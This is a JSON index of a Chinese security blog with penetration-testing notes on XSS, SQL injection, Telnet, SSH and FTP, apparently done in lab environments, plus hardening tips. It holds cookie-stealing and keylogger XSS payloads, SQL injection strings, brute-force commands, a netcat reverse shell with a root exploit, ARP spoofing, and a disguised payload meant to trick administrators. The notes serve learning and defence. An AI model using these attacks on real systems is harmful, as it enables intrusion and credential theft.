x2F;&#x2F;127.0.0.1&#x2F;vulnerabilities&#x2F;xss_d&#x2F;?default&#x3D;&lt;script&gt;alert(&#39;hack&#39;)&lt;&#x2F;script&gt;\nhttp:&#x2F;&#x2F;127.0.0.1&#x2F;vulnerabilities&#x2F;xss_d&#x2F;?default&#x3D;&lt;img src&#x3D;1 οnerrοr&#x3D;alert(&#39;hack&#39;)&gt; \n我们得先闭合前面的标签，我们构造语句闭合option标签：\n &lt;option value&#x3D;&#39;     &quot; + lang + &quot;      &#39;&gt;  &quot;  + decodeURI(lang) +  &quot;  &lt;&#x2F;option&gt;\nhttp:&#x2F;&#x2F;127.0.0.1&#x2F;vulnerabilities&#x2F;xss_d&#x2F;?default&#x3D;&gt;&lt;&#x2F;option&gt;&lt;img src&#x3D;1 οnerrοr&#x3D;alert(&#39;hack&#39;)&gt; \n\n继续构造语句去闭合select标签\nhttp:&#x2F;&#x2F;127.0.0.1&#x2F;vulnerabilities&#x2F;xss_d&#x2F;?default&#x3D; &gt;&lt;&#x2F;option&gt;&lt;&#x2F;select&gt;&lt;img src&#x3D;1 οnerrοr&#x3D;alert(&#39;hack&#39;)&gt;\n\n&#x2F;xss_d&#x2F;?default&#x3D;&lt;script&gt;var img&#x3D;document.createElement(&quot;img&quot;);img.src&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;a?&quot;+escape(document.cookie);&lt;&#x2F;script&gt;  #获取cookie\n\n&#x2F;xss_d&#x2F;?default&#x3D;&lt;script&gt;document.body.innerHTML&#x3D;&quot;&lt;div style&#x3D;visibility:visible;&gt;&lt;h1&gt;DOM XSS By SKI12&lt;&#x2F;h1&gt;&lt;&#x2F;div&gt;&quot;;&lt;&#x2F;script&gt;\n#篡改页面\n\n&#x2F;xss_d&#x2F;?default&#x3D;&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;keylogger.js&quot;&gt;&lt;&#x2F;script&gt;\n#键盘记录，有js文件和php文件。来自于csdn-Mi1k7ea\n\n","slug":"XSS总结","date":"2021-11-09T13:57:15.000Z","categories_index":"安全漏洞基础","tags_index":"owasp TOP 10","author_index":"Longw"},{"id":"9ddada27b22150ae5fda04e61970ba8b","title":"SQL注入1","content":"\n\n最近本来是打算投简历看看的，结果当场面试了，很尴尬。笔试发现自己菜的扣脚。。。毕竟接触时间较短，发现好多我不懂的问题，连http协议都有地方不会。。。。。。。。https的s是用来防止中间人攻击的，反射型xss不是在服务器上。\n一个漏洞一个漏洞的总结吧。。。。\n常见注入点\n表单中的输入域\n URL的参数\n Cookie或者隐藏域\n\n注入点检测?id&#x3D;1     #测试点\n?id&#x3D;1&#39;   #单引号报错\n?id&#x3D;1&quot;   #双引号报错\n?id&#x3D;1\\   #反斜杠报错\n?id&#x3D;1&#39;--+    #注释后面\n?id&#x3D;1&#39;)--+\n?id&#x3D;1&#39;))--+  #有的需要加)或者两个))\n?id&#x3D;1 and 1&#x3D;1 #数字型不变逻辑,后面可加注释如:--+,#等\n?id&#x3D;1 and 1&#x3D;2 #空集逻辑\n?id&#x3D;1 or 1&#x3D;1  #全集逻辑\n?id&#x3D;1&#39;and &#39;1&#39;&#x3D;&#39;1 #字符型不变逻辑，其他如上\n?id&#x3D;1+and+1&#x3D;1--+  #用加号代替空格\n上面还可以进行url编码，有些浏览器自动将空格编码，有些则没有，可以自己利用url编码工具进行编码。\n前面的如果有明显变化的，表示可能存在注入点。若没有明显变化,则可以使用sleep函数测试。\n?id&#x3D;1&#39; and sleep(5)  #用sleep函数进行注入点测试\n当然我们可以直接利用sqlmap进行注入点检测，在kali中\nsqlmap -u http:&#x2F;&#x2F;xxx.xx?id&#x3D;1   #将会自动检测\n\n注入利用–MySQL判断数据库user(),version()\n不同的数据库返回值都各有特征，进而推断是什么数据库类型。\n如user()函数返回情况：\n     mysql返回root@localhost\n     oracle返回sys\n     sqlserver返回sa\n执行成功，即探子回报。说明程序对函数，括号()和子查询并未做过滤，可能可以执行函数、子查询等复杂逻辑。\n探子没有回报，基本上说明注入攻击困难或者注入可能性很小。\n\nGET类型-有回显点order by 3  #判断字段数\n?id&#x3D;1&#39;and 0&#x3D;9 union select 1,2,3  #判断回显点\n\n?id&#x3D;1&#39; and 0&#x3D;9 union select 1,group_concat(schema_name),3 from information_schema.schemata --+ \n#获取所有库名\n?id&#x3D;1&#39; and 0&#x3D;9 union select 1,group_concat(distinct table_schema),3 from    information_schema.tables --+\n#获取所有库名\n\n?id&#x3D;1&#39; and 0&#x3D;9 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database() --+   #获取表名\n\n?id&#x3D;1&#39; and 0&#x3D;9 union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;users&#39; --+   #获取字段名\n\n?id&#x3D;1&#39; and 0&#x3D;9 union select 1,group_concat(username,0x3a,password),3 from users--+  #获取字段值\n\n\n相关函数和数据库结构信息User() current_user() session_user() 返回当前连接的用户名（包含主机名）\nversion() 数据库版本号\ndatabase() 当前连接的数据库名\nlength()   计算字符串长度\nleft()    取最左边的字符\nsubstring() 取字符串中任意长度字长\nposition()  返回字符所在字符串中的位置\nlocate()    返回字符所在字符串中的位置\n在Mysql 5.0以上的版本中，为了方便管理，默认定义了information_schema数据库，用来存储数据库元信息。其中具有表schemata(数据库名)、tables(表名)、columns(列名或字段名)。ROUTINES 存储过程或者函数信息,VIEWS 视图信息,TRIGGERS 触发器信息\n\n在schemata表中，schema_name字段用来存储数据库名。\n在tables表中，table_schema和table_name分别用来存储数据库名和表名。\n在columns表中，table_schema(数据库名)、table_name(表名)、column_name(字段名)\n拓展limit关键字  limit m,n 从m行开始，到m+n行\n\n盲注?id&#x3D;1&#39;and if(left(version(),1)&#x3D;5,sleep(1),2)  #利用sleep函数判断版本号或者用户名，密码等\n?id&#x3D;1&#39; and if(substring(uname,1,1)&#x3D;&#39;b&#39;,benchmark(10000000,md5(&#39;b&#39;)),1)  #Benchmark穷举法猜测用户名和密码等\nSelect sleep(1);睡眠1秒\nSelect left(user(),1)获得user()最左边的1位\nSubstring()获得字符串任意位置的任意个字符\nBenchmark()对运算执行压力测试\nIf()表达式，第一个表达式为真，则执行第二个表达式，否则执行第三个表达式\n一般利用工具盲注，太麻烦太耗时间了。\n\n报错注入没有错误也要制造错误，并把查询的信息让错误带出来告诉注入者到底有什么东西，把所有家底能透露的都透露了。\n相关函数：If(),rand(),floor(),ifnull(),concat,group_concat()\nSelect count(*),concat(version(),floor(rand()*2),user()) as a from users group by a  #暴露系统用户名敏感信息\n\n?id&#x3D; 0&#39; union select 1,2,3 from (select count(*),concat((select concat(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+   #获取数据库\n\nselect count(*),concat((select (select (SELECT schema_name FROM information_schema.schemata limit 0,1)) as a_col from information_schema.tables limit 0,1),floor(rand(0)*2)) x_col from information_schema.tables group by x_col   #获取所有库名\n\n?id&#x3D; 0&#39; union select 1,2,3 from (select count(*),concat((select concat(table_name,0x3a,0x3a) from information_schema.tables where table_schema&#x3D;database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+  #获取表名\n\nselect count(*),concat((select (select (SELECT table_name FROM information_schema.tables where table_schema&#x3D;database() limit 0,1)) as a_col from information_schema.tables limit 0,1),floor(rand(0)*2))x_col from information_schema.tables group by x_col   #获取所有表名\n\n\nid&#x3D; 0&#39; union select 1,2,3 from (select count(*),concat((select concat(username,0x3a, 0x3a,password,0x3a, 0x3a) from security.users limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+   #获取用户信息\n\n?id&#x3D; 0&quot; union select count(*),0,concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))as a from information_schema.tables group by a limit 0,10 --+   #双引号报错注入，前面是单引号。\n\n?id&#x3D;1 and updatexml(2,concat(0x7e,database(),0x7e),1);   \n#利用updatexml函数进行注入,database()是系统函数返回系统变量database的值。@@version代表系统变version\n?id&#x3D;1 and updatexml(2,concat(0x7e,@@version,0x7e),1);\n\n?id&#x3D;1 and extractvalue(1,concat(0x7e,database(),0x7e));   #利用extractvalue函数进行注入\n?id&#x3D;1 and extractvalue(1,concat(0x7e,@@version,0x7e));\n\n宽字节注入当数据库使用gbk编码时，使用%DF%5C，%bf%5c进行宽字节注入，将单引号闭合。\nasscii大于128， GBK首字节对应0x81–0xFE,尾字节对应0x40–0xFE(除去0x7F)。\nSQLMAP使用–tamper=unmagicquotes.py脚本。\n二次注入注入payload，再利用如重置密码功能修改管理员密码。\nadmin&#39;-- -\n\n注入payload，触发xss攻击。\nAccess注入(ASP+Access)只有表，直接用sqlmap查表,基本基于字典\nsqlmap -u url --tables\n\nAccess偏移注入知道表名，得不到字段。\n1.判断字段数 order by\n2.判断表名  使用union select * from 表名,如admin\n3.偏移注入  利用公式注入\n?id&#x3D;1+union+select+1,2,3,4,5,6,7,8,9+from+admin\n?id&#x3D;1+union+select+1,2,3,4,5,*+from+admin  \n#一个一个测试，到5用*号代替显示正常，利用公式\n9-5&#x3D;4;9-4*2&#x3D;1;则从1之后开始\n当前admin表中字段数就为4；\n?id&#x3D;1+union+select+1,a.id,b.id,*+from+(admin+as+a+inner+join+admin+as+b+on+a.id&#x3D;b.id)\n\n\n\n规避检查or–+2=!!!2 类假!!!2为真的结果，利用不变逻辑的!!!替代空格注释替代 and//select//uname//from//users+号连接字符替换\n大小写绕过\nand\n改为\nAnD \n\n双写绕过\nunion\n改为\nuniunionon\n\nand改为&amp;&amp;，or改为||.\n/*!内联*/  内联注释，会执行看里面的内容\n&#x2F;*!union*&#x2F; select 1,2,3 --+\n\n/**/多行注释\nun&#x2F;**&#x2F;ion select 1,2,3 --+\n\n将语句进行url编码\n十六进制码替代%20ASCII码替换char(32)\nand substring(user(),1,1)&#x3D;‘z’\n改为\nand asci(substring(user(),1,1))&#x3D;122   #规避了单引号\n\n空格替换\n%0a  新建一行\n%09  TAB键（水平）\n%0d  return功能\n%0b  TAB键（垂直）\n%0c  新建一页\n%20  就是空格\nhex编码\n\n还有好多内容啊，等后面一一总结吧！！！\n现在的网站基本上都防御了sql注入。想在网站上找到注入点真难。。还是玩靶场好一点。\n","slug":"SQL注入1","date":"2021-11-08T11:24:23.000Z","categories_index":"安全漏洞基础","tags_index":"owasp TOP 10","author_index":"Longw"},{"id":"ee30e4a54bdc40c81ca3faa91eadc5d4","title":"Telnet漏洞","content":"\n\nTelnet介绍(直接复制粘贴)  Telnet协议是TCP/IP协议族中的一员，是Internet远程登陆服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在终端使用者的电脑上使用telnet程序，用它连接到服务器。终端使用者可以在telnet程序中输入命令，这些命令会在服务器上运行，就像直接在服务器的控制台上输入一样。\n  虽然Telnet较为简单实用也很方便，但是在格外注重安全的现代网络技术中，Telnet并不被重用。原因在于Telnet是一个明文传送协议，它将用户的所有内容，包括用户名和密码都明文在互联网上传送，具有一定的安全隐患，因此许多服务器都会选择禁用Telnet服务。如果我们要使用Telnet的远程登录，使用前应在远端服务器上检查并设置允许Telnet服务的功能。\n  Telnet服务端默认情况下使用23端口。\nTelnet版本获取使用nmap获取telnet版本信息，或者使用metasploit获取对应版本信息。\nnmap -p23 -sV IP地址   #对IP23号端口进行探测\n\nmsfconsole\nuse auxiliary&#x2F;scanner&#x2F;telnet&#x2F;telnet_version\nset rhosts IP地址\nrun\n\nTelnet密码破解使用metasploit下针对telnet破解的模块进行用户名和密码的破解。\nmsfconsole\nsearch telnet\nuse auxiliary&#x2F;scanner&#x2F;telnet&#x2F;telnet_login\nset rhosts IP地址\nset user_file 字典路径\nset pass_file 字典路径\nset threads 10\nrun\n\nTelnet登录测试使用破解好的账户名和密码进行登录测试，并执行相应的命令。\n接上面的操作\nsessions -l \nsessioms -i id\n\nTelnet客户端连接Telnet服务器Windows下开启telnet客户端，连接telnet服务端。\ncmd\ntelnet\n?      #查看帮助\no 192.168.249.108    #连接服务器,是uio的o\n输入账号\n输入密码\n成功登录\n\nTelnet明文密码传输使用wireshark抓取telnet数据包\n在kali使用arp欺骗win10自己是主机，然后使用win10连接msf\n通过kali的wireshark抓包获取信息，通过分析找出密码，账号。\nmsf登录Telnet在metasploit中使用telnet_login模块进行登录，并使用sessions -i id 连接shell。\nmsfconsole\nuse auxiliary&#x2F;scanner&#x2F;telnet&#x2F;telnet_login\nshow options\nset rhosts IP地址\nset username msfadmin\nset password msfadmin\nrun\nsessions -L\nsessions -i 1\n\nmsf连接shell下载exp\n使用wget进行下载\nwget https:&#x2F;&#x2F;www.exploit-db.com&#x2F;download&#x2F;8572\n\n但是，这么下载好像不行。所以我们通过kali搭建环境下载。\n再开启一个终端\ncd &#x2F;var&#x2F;www&#x2F;html\nwget https:&#x2F;&#x2F;www.exploit-db.com&#x2F;download&#x2F;8572\nmv 8572 test.c    #将8572改为test.c\ncat test.c\nservice apache2 start \n\n然后，我们回到msf会话中\nwget &quot;http:&#x2F;&#x2F;kaliIP地址&#x2F;test.c&quot;    #进行下载\n\n设置kali nc 监听\n使用netcat进行监听，后期返回的shell\nnc -lvp 4444\n\n我们要对程序进行编译执行exp，获取root权限\n再会话中\ngcc test.c -o exploit\n\n这个时候你可能发现有错误，因为c语言在后面要留几行，在kali中的test.c中加上几个空行就行了。\nrm test.c   #先删除会话中下载的test.c\nwget &quot;http:&#x2F;&#x2F;kaliIP地址&#x2F;test.c&quot;\ngcc test.c -o exploit\nls -alh  #查看权限\necho &#39;#!&#x2F;bin&#x2F;sh&#39; &gt; &#x2F;tmp&#x2F;run\necho &#39;&#x2F;bin&#x2F;netcat -e &#x2F;bin&#x2F;sh kaliIP地址:4444&#39; &gt;&gt; &#x2F;tmp&#x2F;run\nps aux|grep udev    #看到一个root执行\n.&#x2F;expolit 2743   #root执行减一\n\n执行完便可在监听端口执行命令，权限为root。前面有问题直接删除。\nrm /tmp/run\nrm exploit\n有些操作前面写过不截图了，方便。其他操作自己看着办吧。\n","slug":"Telnet漏洞","date":"2021-10-24T13:44:27.000Z","categories_index":"安全漏洞基础","tags_index":"基础漏洞","author_index":"Longw"},{"id":"68847bc4d9b92f6bbe7e25411fa69ec3","title":"ssh漏洞利用","content":"\n\nSSH（安全外壳协议）SSH 为 [Secure Shell](https://baike.baidu.com/item/Secure Shell) 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。SSH最初是UNIX系统上的一个程序，后来又迅速扩展到其他操作平台。SSH在正确使用时可弥补网络中的漏洞。SSH客户端适用于多种平台。几乎所有UNIX平台—包括HP-UX、Linux、AIX、Solaris、Digital UNIX、Irix，以及其他平台，都可运行SSH。\nSSH安装我们使用ubuntu下载openssh_service服务\nsudo apt-get install openssh-server \n\n完成后使用以下命令开启关闭ssh服务\nservice ssh start #启动ssh服务\nservice ssh status #状态获取\nservice ssh stop  #关闭ssh服务\n\nSSH客户端安装使用ubuntu搭建ssh客户端\nsudo apt-get install putty-tools\n\n然后太ubuntu的软件中心找到putty并且安装，之后使用客户端连接服务端。\nSSH banner信息获取\nnmap获取ssh banner信息\n\nnmap -sV -p 22 IP地址\n\n\nmetasploit获取ssh banner信息\n\nmsfconsole\nuse auxiliary&#x2F;sacnner&#x2F;ssh&#x2F;ssh_version    \nset rhosts IP地址\nset rport 22\nrun\n\n\nnc获取ssh banner 信息\n\nnc IP地址 22\n\n配置ssh规避banner信息在ssh配置文件sshd_config中新增一行\nDebian Banner no  再次扫描就没有操作系统信息\ncd &#x2F;etc&#x2F;ssh\nsudo gedit sshd_config\ncrtl+f 输入banner 在下面加上\nDebian Banner no  保存\nsevice ssh restart \n\nmedusa ssh 弱口令破解如果在设置ssh服务时，管理员设置了容易破解出来的用户名和密码，那么测试人员就可以使用对应的密码工具进行暴力破解弱口令。破解出来就可以使用对应的用户名和密码登录系统。\nmedusa\nmedusa -d   #查看支持模块\nmedusa -h IP地址 -u 用户名 -p 字典路径 -M 模块   #进行破解\nsucess表示破解成功\n\nSSH命令行工具登录一般情况下Linux下都具有ssh客户端，用来登陆ssh服务端。可以使用ssh用户名@IP地址，然后根据提示输入密码。（默认22端口）\nssh 用户名@IP地址\n\nmetasploit利用ssh登陆反弹shell使用metasploit可以进行ssh登陆(破解)，会自动建立对应的Bash shell连接。\nmsfconsole\nuse auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_login\nset rhosts IP地址\nset username xxx\nset password xxx\nrun\n成功后\nsessions -l\nsesssions -i 1\n成功登陆\n\nmetasploit获取meterpreter shell利用获取的Bash shell，注入metasploit中meterpreter payload从而获取更强大功能的shell。\nsessions -u 1\nsessions -i id\n使用后面登陆成功\nhelp  #查看可以使用的命令\n\nSSH安全防御\nssh修改默认端口\n\ncd &#x2F;etc&#x2F;ssh\nsudo gedit sshd_config\nctrl+f  找端口port\n将端口port修改为其他端口，如：2222\nservice ssh restart  重启ssh服务，使修改生效\n\n\nssh设置pgp登陆\n\n在默认情况下，ssh使用用户名和密码进行远程登陆，但也可以使用密钥对进行身份验证登录。(公钥和私钥)\n生成ssh密钥对，使用puttygen\n下载：https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html  可能不对，直接360下载。ok\n打开puttygen生成私钥，保存到桌面private.ppk。使用ssh-keygen命令在Linux生成.ssh目录，在.ssh下新建密钥存储文件authorized_keys.并复制私钥文件到.ssh目录下。使用putty -l命令将内容拷贝到authorized_keys中。之后通过putty加载私钥文件进行ssh连接。\nssh-keygen -t rsa  之后一之前确定，自动生成.ssh目录\nls -alh  查看所有文件\ncd .ssh \ntouch authrized_keys   生成文件\n将private.ppk拷贝到.ssh目录下\nputtygen -L private.ppk   查看内容，之后我们将内容复制\ngedit authorized_keys   打开后，我们将复制内容放进去\n\n完成后使用win10刚刚360下载好的putty客户端加载私钥文件进行连接。\n在Auth里加载文件。\n输入IP地址和端口（刚刚已经改为了2222）\n直接连接。\n\nssh防御暴力破解用户账号\n\n在Linux下可以配置不能使用用户名和密码登陆。只使用ssh pgp方式验证登陆。规避了ssh暴力破解。\n问题：不适用用户名和密码登陆，很大程度上存在复杂操作问题。\ncd &#x2F;etc&#x2F;ssh&#x2F;\nsudo gedit sshd_config\nctrl+f  输入password Authentication\n将yes改为no  保存退出\nservice ssh restart  重启服务\n\n\nIptable设置阈值防止暴力破解\n\nsudo iptables -I INPUT -p tcp --dport 2222 -i eth0 -m state --state NEW -mrecent --set\nsudo iptables -I INPUT -p tcp --dport 2222 -i eth0 -m state --state NEW -m recent --updata --seconds 120 --hitcount 3 -jDROP  #3次密码不对就暂停连接120秒，也可修改时间\nservice ssh restate  #重启服务\n\n表示连接3次不对，停止接收数据包防止暴力破解。最好还是要设置复杂密码，防止被字典跑出来。\n毕竟我曾经在群里看到一个变态跑了一年跑出来了。。。。。。。\n因为安全方面设置好了，前面就没有截图。不过步骤都写的很清楚了。。。\n","slug":"ssh漏洞利用","date":"2021-10-15T10:06:04.000Z","categories_index":"安全漏洞基础","tags_index":"基础漏洞","author_index":"Longw"},{"id":"add830c1c066eef908d48bdb9bf71238","title":"FTP漏洞利用","content":"\n\n​                                     开始记录一个安全漏洞利用\nFTP协议文件传输协议(英文：File Transfer Protocol)。是用于在网络上进行文件传输的一套标准协议，使用客户/服务器模式。它属于网络传输协议的应用层。FTP使用21号端口。\nFTP用户分类\nReal    一般用户   \n\nAdministrator  管理员\n\nAnonymous    匿名用户\n\n\nFTP文件传输格式\nASCII\n二进制格式\n\n利用FTP匿名登陆漏洞由于FTP没有禁止匿名用户，所以可以直接使用Anonymous用户直接登录FTP服务器。使用nc连接FTP。\n本次靶机是windows2003企业版     攻击机为kali\n\n打开kali终端切换到root用户，使用kali自带nmap进行目标端口扫描看是否开启FTP服务\n\nnmap IP地址   \n\n扫描完成，发现开启了21号端口\n\n使用nmap进行漏洞扫描\n\nnmap --script vuln -p 21 IP地址    #漏洞扫描，p表示端口号，script表示脚本\n\n显示有匿名登陆漏洞，直接使用nc测试。\n\n使用nc进行FTP登陆\n\nnc IP地址 21   #进行连接\nUSER anonymous   #输入用户名为匿名用户\nPASS 123  #密码为123\n回车登陆\npwd   #查看当前目录\n\n成功登录靶机。\n利用FTP后门漏洞vsftpd手工触发漏洞，当进行FTP认证时，如果用户名中包含:)，那么直接就触发监听6200端口连接的shell。\n本次靶机Metasploittable2-Linux     攻击机kali\n这个漏洞是特定版本才有的，先用nc直接连接，看看是不是有漏洞的版本\n\nnc连接\n\nnc 192.168.249.108 21    #连接靶机\nUSER use:)    #触发漏洞\nPASS 123   #密码随便输入\n\n发现成功触发，并没有显示连接失败。接下来打开另一个终端直接连接6200端口\n\nnc连接后门\n\nnc 192.168.249.108 6200   #连接触发的后门\nid    #连接成功后，查看当前用户\n\n成功连接后门，并且拥有root权限。\nFTP安全配置\n修改配置文件，禁止匿名登录\n在windows中打开服务器管理，找到FTP，选择属性–&gt;安全—&gt;将允许匿名登陆的勾去掉\n在Linux中找到vsftpd.conf文件，打开找到allow_anonymous将其设置为no或者其他相应否定词\n\n对特定漏洞进行打补丁或者设置防火墙禁止连接后门端口\n打补丁直接更新版本就行\n禁止连接看下面的命令\niptables -A INPUT -p tcp -dport 6200 -j DROP\niptacles -A OUTPUT &#x3D;p tcp sport 6200 -j DROP\n\nFTP用户名密码暴力破解Windows下cmd命令添加用户，并提升为Administrator管理员权限\nnetuser 用户名 用户密码 &#x2F;add   #添加用户\nnet localgroup administrators admin &#x2F;add  #添加到管理员组\n\nWindows下使用FTP服务器添加用户操作\n打开IIS服务，找到FTP，添加用户\n使用medusa暴力破解FTP登录\n本次靶机Windows2003企业版    攻击机kali\nmedusa -d    #查看可以使用的模块\n\n发现有FTP模块，利用FTP模块进行暴力破解\nmedusa -h 192.168.249.109 -u admin -P 字典路径 -M ftp   #使用ftp模块，用户名admin，密码用字典进行破解\n\n破解成功，发现用户名admin，密码admin测试登录看看。\n成功利用破解的用户名和密码登录。\nFTP用户名明文密码的验证FTP协议中用于用户认证的过程中，客户端与服务器端是通过明文进行叫交互信息，验证FTP登录过程中明文传输用户名和密码可以使用wireshark进行抓包分析。\n打开kali的wireshark，在过滤器填写ftp回车，一定要回车不然不会过滤。然后鼠标双击eth0选择抓取的网卡。\n接着在终端使用nc进行FTP连接，连接完成后对抓取的数据包进行分析。我们查看本机对连接机发送的数据包，本机ip为192.168.249.112，连接机ip为192.168.249.109.\n发现明文暴露出连接账户和密码信息，成功验证。\nFTP用户名密码明文嗅探刚刚上面讲到FTP在登陆时是使用明文传输，没有进行加密的。那我们如何进行利用呢？\n我们可以是用arpspoof进行ARP嗅探，就是我们利用脚本对我们进行连接FTP服务器的客户机进行欺骗，使客户机以为我们是网关路由器。欺骗成功后，客户机对网关发送到信息就会被我们接收到然后在传送给路由网关。\n打开终端使用arpspoof脚本\narpspoof -i eth0 192.168.249.1 -t 192.168.249.102   #客户机为102\n\n欺骗开始后不要动。。。。。。\n打开本机win10，在cmd中使用arp -a 。来查看网关的MAC地址是不是kali的MAC地址，若是则代表欺骗成功。\n打开kali另一终端，输入命令：ifconfig   查看mac地址\n再到win10中查看网关mac地址\n00:xx:xx:xx:xx:b0    #kali的MAC地址\n00-50-xx-xx-xx-b0     #win10中网关地址\n\n发现一样，欺骗成功。\n在win10中使用ftp登陆win2003，在kali中使用wireshark抓取数据包，并进行分析。\nftp IP地址    #登录到IP地址的ftp服务\n输入用户名  \n输入密码   \n\n登陆完成后，查看wireshark中中抓取的数据包。\n成功获得用户名和密码。。。。。。\nFTP登陆之后的事情讲了那么多，那么我们利用漏洞登陆之后该怎么做呢？我们可以利用metasploit建立反弹shell上传到FTP服务器。可以利用setoolkit快速生成反弹shell。\nmsfconsole   #打开msf\nsetoolkit  #使用setoolkit\n1      #选择一些模块，包括后面的\n4\n2\nkali的IP地址\n端口    #后门端口号，设置完成之后立刻生成payload并且询问是否开始监听\nyes   #开始监听\n\n生成的payload在/root/.set里面\ncd &#x2F;root&#x2F;.set   #进入目录\nls   #查看文件\nmv payload.exe &#x2F;home&#x2F;xxx&#x2F;桌面&#x2F;   #将payload移动到桌面\n\n之后我们可以使用任意FTP客户端连接服务器，然后将生成的payload上传到服务器。当然上传之前可以将payload改名和改显示图片，让人看了就忍不住点击打开的哪一种。当管理人员点击打开后，kali中立马会收到会话。\nsessions -l   #查看会话\nsessions -i x  #选择连接x号会话\n\nhelp   #查看帮助\nsysinfo   #查看系统信息\nkeyscan_start    #开启键盘输入记录\nkeyscan_dump   #查看键盘记录\n\n键盘输入情况演示\n因为图片加载不出来，自己试试看就知道了，这边就不放图片了。\n当然，还有很多操作可以自己试一试。在进行前最好建立快照，一不小心搞了破坏也方便恢复嘛！！！\n防御\n禁止匿名用户登陆\n及时更新版本，防止老版本漏洞\n设置连接次数防止暴力破解\n密码明文，所以最好不适用FTP，用其他类似替代\n\n","slug":"FTP漏洞利用","date":"2021-10-07T07:38:38.000Z","categories_index":"安全漏洞基础","tags_index":"基础漏洞","author_index":"Longw"},{"id":"5edbb0bb0225a5f787cc77b6741890ba","title":"Linux命令","content":"\n\nLinux命令学了好久了，还是不好记住，写个笔记方便查看吧。\nRed Hat专属快捷键ctrl+alt+F2   #切换为字符界面(F2~F7个命令行界面)\nctrl+alt+F1   #切换为图形界面\n\n基础命令快捷键反斜杠\\    #强制换行\nTAB    #自动补齐\nCTRL+U  #清空至行首\nCTRL+K  #清空至行尾\nCTRL+L  #清屏\nCTRL+C  #取消本次命令编辑\nxx --help  #查看xx的帮助信息\nman ls   #查看帮助\nuname -r  #查看内核\nuname -a  #查看系统\nwhich uname #当前目录\nhostname   #查看主机名\nifconfig  #查看网卡信息\ncat &#x2F;proc&#x2F;cpuinfo   #查看cpu信息\ncat &#x2F;proc&#x2F;meminfo   #查看内存信息\nreboot  #重启\nshutdown -h now   #立刻关机\npwd   #查看当前目录\n\ncd命令   切换目录cd    #切换目录\ncd &#x2F;etc&#x2F;httpd    #绝对路径\ncd abc    #相对路径\n\nls命令   查看文件ls  #查看目录的文件\nls -l  #详细查看\nls -a  #查看全部文件\nls -h  #察看文件大小\nls -alh  #就上面全部\n\ndu命令   查看文件大小du  #查看当前文件夹大小\ndu -a   #统计时包括所有文件，不仅仅只统计目录\ndu -h   #以更易读懂的字节单位(k,m等)显示信息\ndu -s   #只统计每个参数所占用的空间总的大小\n\nmkdir命令   创建目录mkdir   #创建新目录\nmkdir -p &#x2F;路径名&#x2F; 目录名   #创建目录\n\ntouch命令  创建文件touch  #新建空文件或更新文件时间标记\ntouch 文件名  #新建文件\n\nln命令   建立连接ln    #为文件或目录建立链接(link)\nln -s 源文件或目录 -----&gt; 链接目录   #创建链接\n-s表示建立符号链接文件(省略此项则建立硬链接)\n\ncp命令   复制文件cp   #复制文件或目录\ncp 【选项】 源文件目录 目标文件目录  \n-r  #递归复制整个目录\n-f   #强制覆盖目标同名文件或目录\n-p   #保持源文件的属性不变\n-i   #需要覆盖文件或目录时进行提醒\n\nrm命令   删除文件rm   #删除\nrm 【选项】 文件目录\n-f  #强制删除文件&#x2F;目录,不进行提醒\n-i  #删除文件或目录时提醒用户确认\n-r  #表示递归\n\nmv命令   移动文件mv 【选项】 源文件&#x2F;目录 目标文件&#x2F;目录   #移动文件\n-b   #当目标文件或目录存在时，在执行覆盖前，会为其创建一个备份。\n-i   #如果指定移动的源目录或文件与目标的目录或文件同名，则会先询问是否覆盖旧文件，输入 y 表示直接覆盖，输入 n 表示取消该操作。\n-f   # 如果指定移动的源目录或文件与目标的目录或文件同名，不会询问，直接覆盖旧文件。\n-n   #不要覆盖任何已存在的文件或目录。\n-u   #当源文件比目标文件新或者目标文件不存在时，才执行移动操作\n\nfind命令     查找文件find   #用于查找文件或目录\nfind 查找范围 查找文件\n-name  #按照文件名查找\n-size #按照文件大小查找\n-uesr #按照文件属主查找\n-type #按照文件类型查找\n\nvi命令   编辑文件vi   #表示进入\nvi 【选项】 【t[n]】 【file】\n-r   #用于恢复系统忽然崩溃时正在编辑的文件\n-R   #用于只读方式打开文件\n+n   #用来指明进入vi后直接位于文件的第几行，如不指定n则位于最后一行\na  #在光标后附近文本\nA  #在本行行末附加文本\ni  #在光标前插入文本\nI  #在光标开始时插入文本\no  #在光标下插入新行\nO  #在光标上插入新行\n&#x2F;string 向下 向前搜索指定字符串搜索时忽略大小写\n？  向上\nn  搜索指定字符串的下一个出现位置\n:%s&#x2F;查找内容&#x2F;替换内容&#x2F;g   #全文替换为指定字符串，g表示不提示，s表示搜索，%表示全部\n:n1,n2s&#x2F;查找内容&#x2F;替换内容&#x2F;g   #在一定范围替换指定字符串，n1到n2行\nU  #返回的上一步\n:set nu   #显示行号\n:q    #直接退出\n:wq   #保存后退出\n:q!   #强制退出\n:.   #重复上一个命令\nD   #光标到行尾全部删除\ndd   #删除光标在的那一行\np   #粘贴dd删除的那一行\n\ncat命令   查看文件cat   #显示文件的全部内容\n-n   #给输出的所有行加上编号\ncat 1 2 &gt; 3   #合并文件\n\nwc命令    统计文件内容wc   #统计文件中的单次数量字节数行数\n-I  #统计行数\n-w  #统计单词数\n-c  #统计字符数\nwc sdxh.txt   #会出现 2 4 26,2是行数，4是单词数，26是字符数\nhistory   #查看历史命令\n\ngzip和bzip2命令  压缩文件gzip   bzip2   #都是归档和压缩文件命令\n只针对单个文件压缩\n-g   #显示高压缩比\n-d   #释放压缩文件\ngzip 文件名 压缩文件     #格式为后缀有.gz\nbzip2 文件名 压缩成的文件名  #格式为 文件.bz2,他相对于gzip压缩率更高\n\ntar命令   解压压缩文件tar\ntar -tvf 